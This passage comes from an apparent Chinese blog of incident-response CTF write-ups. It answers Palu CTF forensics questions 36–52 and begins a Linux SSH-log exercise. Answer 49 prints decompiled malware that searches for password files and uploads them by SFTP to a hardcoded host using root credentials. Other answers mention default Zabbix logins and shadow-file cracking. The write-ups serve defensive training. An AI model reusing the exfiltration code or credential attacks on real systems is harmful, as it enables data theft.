href="#36-提交攻击者在监控服务器上留下的dcnlog地址" class="headerlink" title="36.提交攻击者在监控服务器上留下的dcnlog地址"></a>36.提交攻击者在监控服务器上留下的dcnlog地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxx.xx.xx]</span><br></pre></td></tr></table></figure><p>MYSQL Server 2 中 zabbix库中 scripts表中发现 dcnlog地址<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506163649459.png" alt="image-20240506163649459"></p><p>flag:[palu.dcnlog.cn]</p><h3 id="37-提交监控服务器上恶意用户的上一次登录时间"><a href="#37-提交监控服务器上恶意用户的上一次登录时间" class="headerlink" title="37.提交监控服务器上恶意用户的上一次登录时间"></a>37.提交监控服务器上恶意用户的上一次登录时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xx/xx/xx/xx:xx:xx]</span><br></pre></td></tr></table></figure><p>登陆 zabbix 服务器 服务登录信息未知  可以使用默认密码 Admin&#x2F;zabbix<br>也可以在 MYSQL Server 2 中搜密码<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506164200702.png" alt="image-20240506164200702"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506164421387.png" alt="image-20240506164421387"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506164753810.png" alt="image-20240506164753810"></p><p>flag:[2024&#x2F;04&#x2F;17&#x2F;01:32:44]</p><h3 id="38-提交监控服务器上遗留的反弹shell地址和端口"><a href="#38-提交监控服务器上遗留的反弹shell地址和端口" class="headerlink" title="38.提交监控服务器上遗留的反弹shell地址和端口"></a>38.提交监控服务器上遗留的反弹shell地址和端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxx:xx]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506165358799.png" alt="image-20240506165358799"><br>base64解码<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506165442862.png" alt="image-20240506165442862"></p><p>flag:[154.183.110.12:7890]</p><h3 id="39-提交恶意钓鱼文件的哈希"><a href="#39-提交恶意钓鱼文件的哈希" class="headerlink" title="39.提交恶意钓鱼文件的哈希"></a>39.提交恶意钓鱼文件的哈希</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxx]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506205000624-1714999801738-1.png" alt="image-20240506205000624"></p><p>提交发现提交成功</p><p>flag:[da75025ff7f3b6baa27f5913c1c83063]</p><p>查看其会话记录也可以看到 恶意文件的哈希<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506211058615.png" alt="image-20240506211058615"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506211251938.png" alt="image-20240506211251938"></p><h3 id="40-提交恶意文件外联IP（未解出）"><a href="#40-提交恶意文件外联IP（未解出）" class="headerlink" title="40.提交恶意文件外联IP（未解出）"></a>40.提交恶意文件外联IP（未解出）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxx]</span><br></pre></td></tr></table></figure><p>该题 我放到在线沙箱平台 微步<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506214801765.png" alt="image-20240506214801765"></p><p>检测全绿  网络连接是有一个 120.92.102.194  提交 flag 错误<br>在<a href="https://www.virustotal.com/%E4%B8%AD%E6%9C%89%E4%BA%94%E4%B8%AAIP">https://www.virustotal.com/中有五个IP</a>  但是提交都错误<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506215039009.png" alt="image-20240506215039009"><br>有一种大胆的想法<br>可能是域名解析出来的IP  钓鱼。。。<br>paluctf平台整了CDN</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506220143557.png" alt="image-20240506220143557"></p><p>flag:[未知]</p><h3 id="41-提交被恶意文件钓鱼使用者的姓名"><a href="#41-提交被恶意文件钓鱼使用者的姓名" class="headerlink" title="41.提交被恶意文件钓鱼使用者的姓名"></a>41.提交被恶意文件钓鱼使用者的姓名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxx]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506204444682.png" alt="image-20240506204444682"></p><p>在此用户文件夹下发现恶意钓鱼文件</p><p>flag:[陈琚鹭]</p><h3 id="42-提交攻击者留下的信息"><a href="#42-提交攻击者留下的信息" class="headerlink" title="42.提交攻击者留下的信息"></a>42.提交攻击者留下的信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxx]</span><br></pre></td></tr></table></figure><p>继续查看会话记录  发现在注册表中添加了字符串<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506220818730.png" alt="image-20240506220818730"></p><p>flag:[flag{2024-04-17-hi}]</p><h3 id="43-提交恶意用户数量"><a href="#43-提交恶意用户数量" class="headerlink" title="43.提交恶意用户数量"></a>43.提交恶意用户数量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[md5(xxxx)]</span><br></pre></td></tr></table></figure><p>除去中文字符 （员工姓名） 系统自带用户<br>admin+编号&#x2F;dev+编号&#x2F;sale+编号 为恶意用户<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506222244295.png" alt="image-20240506222244295"></p><p>flag:[md5(49)]</p><h3 id="44-请提交员工集体使用的密码"><a href="#44-请提交员工集体使用的密码" class="headerlink" title="44.请提交员工集体使用的密码"></a>44.请提交员工集体使用的密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxx]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506221813103.png" alt="image-20240506221813103"></p><p>flag:[Network@2020]</p><h3 id="45-提交加密文件的哈希"><a href="#45-提交加密文件的哈希" class="headerlink" title="45.提交加密文件的哈希"></a>45.提交加密文件的哈希</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxx]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506223134802.png" alt="image-20240506223134802"></p><p>找到加密文件 算出加密文件的哈希值  方法与31题类似</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506223434442.png" alt="image-20240506223434442"></p><p>flag:[2bf71a0d6d4e70cec7602da2b653e2ab]</p><h3 id="46-提交被攻击者加密的内容明文"><a href="#46-提交被攻击者加密的内容明文" class="headerlink" title="46.提交被攻击者加密的内容明文"></a>46.提交被攻击者加密的内容明文</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxx]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506223527665.png" alt="image-20240506223527665"></p><p>加密文本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">玛巴轰达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰玛巴轰玛巴玛巴玛巴轰达姆阿卡嗙轰哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰伊卡阿卡噢伊卡阿卡噢轰玛卡巴卡轰哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰咿呀呦咿呀呦咿呀呦轰阿巴雅卡阿巴雅卡阿巴雅卡阿巴雅卡轰伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰哈姆达姆阿卡嗙轰</span><br></pre></td></tr></table></figure><p>加解密参考<br><a href="https://www.ddosi.org/drt-aav/">Drt免杀生成器 Drt AAV | Bypass AV | 杀软绕过 - 🔰雨苁ℒ🔰 (ddosi.org)</a><br>这里贴上 Wbuildings师傅的解密代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">values = [<span class="string">&#x27;玛卡巴卡轰&#x27;</span>, <span class="string">&#x27;阿巴雅卡轰&#x27;</span>, <span class="string">&#x27;伊卡阿卡噢轰&#x27;</span>, <span class="string">&#x27;哈姆达姆阿卡嗙轰&#x27;</span>, <span class="string">&#x27;咿呀呦轰&#x27;</span>, <span class="string">&#x27;玛卡雅卡轰&#x27;</span>, <span class="string">&#x27;伊卡阿卡轰&#x27;</span>, <span class="string">&#x27;咿呀巴卡轰&#x27;</span>, <span class="string">&#x27;达姆阿卡嗙轰&#x27;</span>, <span class="string">&#x27;玛卡巴卡玛卡巴卡轰&#x27;</span>, <span class="string">&#x27;玛卡巴卡玛卡巴卡玛卡巴卡轰&#x27;</span>, <span class="string">&#x27;玛卡巴卡玛卡巴卡玛卡巴卡玛卡巴卡轰&#x27;</span>, <span class="string">&#x27;阿巴雅卡阿巴雅卡轰&#x27;</span>, <span class="string">&#x27;阿巴雅卡阿巴雅卡阿巴雅卡轰&#x27;</span>, <span class="string">&#x27;阿巴雅卡阿巴雅卡阿巴雅卡阿巴雅卡轰&#x27;</span>, <span class="string">&#x27;伊卡阿卡噢伊卡阿卡噢轰&#x27;</span>, <span class="string">&#x27;伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰&#x27;</span>, <span class="string">&#x27;伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰&#x27;</span>, <span class="string">&#x27;哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰&#x27;</span>, <span class="string">&#x27;哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰&#x27;</span>, <span class="string">&#x27;哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰&#x27;</span>, <span class="string">&#x27;咿呀呦咿呀呦轰&#x27;</span>, <span class="string">&#x27;咿呀呦咿呀呦咿呀呦轰&#x27;</span>, <span class="string">&#x27;咿呀呦咿呀呦咿呀呦咿呀呦轰&#x27;</span>, <span class="string">&#x27;咿呀呦咿呀呦咿呀呦咿呀呦咿呀呦轰&#x27;</span>, <span class="string">&#x27;玛卡雅卡玛卡雅卡轰&#x27;</span>, <span class="string">&#x27;玛卡雅卡玛卡雅卡玛卡雅卡轰&#x27;</span>, <span class="string">&#x27;玛卡雅卡玛卡雅卡玛卡雅卡玛卡雅卡轰&#x27;</span>, <span class="string">&#x27;伊卡阿卡伊卡阿卡轰&#x27;</span>, <span class="string">&#x27;伊卡阿卡伊卡阿卡伊卡阿卡轰&#x27;</span>, <span class="string">&#x27;伊卡阿卡伊卡阿卡伊卡阿卡伊卡阿卡轰&#x27;</span>, <span class="string">&#x27;咿呀巴卡咿呀巴卡轰&#x27;</span>, <span class="string">&#x27;咿呀巴卡咿呀巴卡咿呀巴卡轰&#x27;</span>, <span class="string">&#x27;咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰&#x27;</span>, <span class="string">&#x27;咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰&#x27;</span>, <span class="string">&#x27;达姆阿卡嗙达姆阿卡嗙轰&#x27;</span>, <span class="string">&#x27;达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰&#x27;</span>, <span class="string">&#x27;达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰&#x27;</span>, <span class="string">&#x27;达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰&#x27;</span>, <span class="string">&#x27;巴卡巴卡轰&#x27;</span>, <span class="string">&#x27;巴卡巴卡巴卡巴卡轰&#x27;</span>, <span class="string">&#x27;巴卡巴卡巴卡巴卡巴卡巴卡轰&#x27;</span>, <span class="string">&#x27;巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰&#x27;</span>, <span class="string">&#x27;巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰&#x27;</span>, <span class="string">&#x27;呀呦轰&#x27;</span>, <span class="string">&#x27;呀呦呀呦轰&#x27;</span>, <span class="string">&#x27;呀呦呀呦呀呦轰&#x27;</span>, <span class="string">&#x27;呀呦呀呦呀呦呀呦轰&#x27;</span>, <span class="string">&#x27;呀呦呀呦呀呦呀呦呀呦轰&#x27;</span>, <span class="string">&#x27;达姆阿卡轰&#x27;</span>, <span class="string">&#x27;达姆阿卡达姆阿卡轰&#x27;</span>, <span class="string">&#x27;达姆阿卡达姆阿卡达姆阿卡轰&#x27;</span>, <span class="string">&#x27;达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰&#x27;</span>, <span class="string">&#x27;达姆阿卡达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰&#x27;</span>, <span class="string">&#x27;玛巴轰&#x27;</span>, <span class="string">&#x27;玛巴玛巴轰&#x27;</span>, <span class="string">&#x27;玛巴玛巴玛巴轰&#x27;</span>, <span class="string">&#x27;玛巴玛巴玛巴玛巴轰&#x27;</span>, <span class="string">&#x27;巴卡玛巴轰&#x27;</span>, <span class="string">&#x27;巴卡玛巴巴卡玛巴轰&#x27;</span>, <span class="string">&#x27;巴卡玛巴巴卡玛巴巴卡玛巴轰&#x27;</span>, <span class="string">&#x27;巴卡玛巴巴卡玛巴巴卡玛巴巴卡玛巴轰&#x27;</span>, <span class="string">&#x27;妈个巴子轰&#x27;</span>, <span class="string">&#x27;妈个巴卡轰&#x27;</span>, <span class="string">&#x27;妈个巴达轰&#x27;</span>]</span><br><span class="line">keys = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;+&#x27;</span>]</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;玛卡巴卡玛卡巴卡轰达姆阿卡嗙轰阿巴雅卡阿巴雅卡阿巴雅卡轰达姆阿卡嗙轰哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰玛卡巴卡轰达姆阿卡嗙轰阿巴雅卡阿巴雅卡轰咿呀呦轰达姆阿卡嗙轰&#x27;</span></span><br><span class="line"></span><br><span class="line">c_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c.split(<span class="string">&#x27;轰&#x27;</span>):</span><br><span class="line">c_list.append(i+<span class="string">&#x27;轰&#x27;</span>)</span><br><span class="line"></span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c_list[:-<span class="number">1</span>]:</span><br><span class="line"><span class="keyword">if</span> i <span class="keyword">in</span> values:</span><br><span class="line">index = values.index(i)</span><br><span class="line">m+=keys[index]</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;玛巴轰达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰玛巴轰玛巴玛巴玛巴轰达姆阿卡嗙轰哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰伊卡阿卡噢伊卡阿卡噢轰玛卡巴卡轰哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰咿呀呦咿呀呦咿呀呦轰阿巴雅卡阿巴雅卡阿巴雅卡阿巴雅卡轰伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰哈姆达姆阿卡嗙轰&#x27;</span></span><br><span class="line"></span><br><span class="line">c_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c.split(<span class="string">&#x27;轰&#x27;</span>):</span><br><span class="line">c_list.append(i+<span class="string">&#x27;轰&#x27;</span>)</span><br><span class="line"></span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c_list[:-<span class="number">1</span>]:</span><br><span class="line"><span class="keyword">if</span> i <span class="keyword">in</span> values:</span><br><span class="line">index = values.index(i)</span><br><span class="line">m+=keys[index]</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;jinitaimei&#125;  密码学 玛卡巴卡有什么坏心思</span></span><br><span class="line"><span class="comment"># 2024ispassword   该题flag</span></span><br></pre></td></tr></table></figure><p>flag:[2024ispassword]</p><h3 id="47-请提交符合基线标准的服务器数量"><a href="#47-请提交符合基线标准的服务器数量" class="headerlink" title="47.请提交符合基线标准的服务器数量"></a>47.请提交符合基线标准的服务器数量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[md5(xx)]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506224943124.png" alt="image-20240506224943124"></p><p>一共就6台</p><p>flag:[md5(0)] </p><h3 id="48-提交办公区的恶意文件哈希"><a href="#48-提交办公区的恶意文件哈希" class="headerlink" title="48.提交办公区的恶意文件哈希"></a>48.提交办公区的恶意文件哈希</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxx]</span><br></pre></td></tr></table></figure><p>通过文件传输 发现存在 palucomeyi1.exe<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506225243357.png" alt="image-20240506225243357"></p><p>在PC2定位得到 palucomeyi1.exe所在文件夹<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506225605737.png" alt="image-20240506225605737"></p><p>根据前面方法类似 得到  该恶意文件的哈希<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506225724720.png" alt="image-20240506225724720"></p><p>flag:[5232a191eb2913337e0a93b0a990f2a2]</p><h3 id="49-提交恶意回连端口"><a href="#49-提交恶意回连端口" class="headerlink" title="49.提交恶意回连端口"></a>49.提交恶意回连端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxx]</span><br></pre></td></tr></table></figure><p>由于是一个python封装的exe文件<br>与第六题类似  将其进行解包得到pyc文件<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240507001507626.png" alt="image-20240507001507626"><br>成功转成pyc文件<br>将pyc 使用线上平台反编译成py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_in_files</span>(<span class="params">directory, search_text</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssh</span>(<span class="params">local_file_path, remote_file_path</span>):</span><br><span class="line">    hostname = <span class="string">&#x27;192.168.20.123&#x27;</span></span><br><span class="line">    port = <span class="number">22</span></span><br><span class="line">    username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;Network@2020&#x27;</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(hostname, port, username, password)</span><br><span class="line">    sftp = client.open_sftp()</span><br><span class="line">    sftp.put(local_file_path, remote_file_path)</span><br><span class="line">    sftp.close()</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;File <span class="subst">&#123;local_file_path&#125;</span> uploaded to <span class="subst">&#123;remote_file_path&#125;</span> on <span class="subst">&#123;hostname&#125;</span>&#x27;&#x27;&#x27;</span>)</span><br><span class="line">    flag = <span class="string">&#x27;flag&#123;234567uyhgn_aiduyai&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">search_directory = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">search_for_text = <span class="string">&#x27;passwod&#x27;</span></span><br><span class="line">(a, b) = search_in_files(search_directory, search_for_text)</span><br><span class="line">ssh(a, b)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag:[22]</p><h3 id="50-提交恶意程序中的flag"><a href="#50-提交恶意程序中的flag" class="headerlink" title="50.提交恶意程序中的flag"></a>50.提交恶意程序中的flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxx]</span><br></pre></td></tr></table></figure><p>根据上题代码可知</p><p>flag:flag{234567uyhgn_aiduyai}</p><h3 id="51-提交恶意文件中的search-for-text内容"><a href="#51-提交恶意文件中的search-for-text内容" class="headerlink" title="51.提交恶意文件中的search_for_text内容"></a>51.提交恶意文件中的search_for_text内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxx]</span><br></pre></td></tr></table></figure><p>根据上上题代码可知</p><p>flag:[passwod]</p><h3 id="52-提交web服务器上攻击者修改后的root密码"><a href="#52-提交web服务器上攻击者修改后的root密码" class="headerlink" title="52.提交web服务器上攻击者修改后的root密码"></a>52.提交web服务器上攻击者修改后的root密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式为:[xxxx]</span><br></pre></td></tr></table></figure><p>思路是参考14题<br>导出shadow文件  进行john哈希爆破 由于字典中没有这个密码 没跑出来<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506224540576.png" alt="image-20240506224540576"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240506224609225.png" alt="image-20240506224609225"></p><p>flag:[Network@20202020]</p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第一章-应急响应-Linux日志分析</title>
      <link href="/2024/03/19/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2024/03/19/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">by:https://xj.edisec.net/challenges/24</span><br><span class="line">账号root密码linuxrz</span><br><span class="line">ssh root@IP</span><br><span class="line">1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&quot;分割</span><br><span class="line">2.ssh爆破成功登陆的IP是多少，如果有多个使用&quot;,&quot;分割</span><br><span class="line">3.爆破用户名字典是什么？如果有多个使用&quot;,&quot;分割</span><br><span class="line">4.登陆成功的IP共爆破了多少次</span><br><span class="line">5.黑客登陆主机后新建了一个后门用户，用户名是多少</span><br></pre></td></tr></table></figure><blockquote><p>ssh日志存在于&#x2F;var&#x2F;log&#x2F;auth.log</p></blockquote><blockquote><p>题目分析&#x2F;var&#x2F;log&#x2F;auth.log.1</p></blockquote><h3 id="1-有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割"><a href="#1-有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割" class="headerlink" title="1.有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割"></a>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</h3><p>原本想查看ssh登陆日志后过滤包含root的内容</p><p>但是<code>grep &quot;root&quot;</code>报错</p><p>搜报错信息 我们可以使用 <code>grep -a &quot;root&quot;</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240319202248197.png" alt="image-20240319202248197"></p><p>根据<strong>Failed password for root</strong>我们可以跟进过滤</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240319202848839.png" alt="image-20240319202848839"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可知有 192.168.200.32,192.168.200.2,192.168.200.31</span><br><span class="line"></span><br><span class="line">flag&#123;192.168.200.2,192.168.200.32,192.168.200.31&#125;</span><br><span 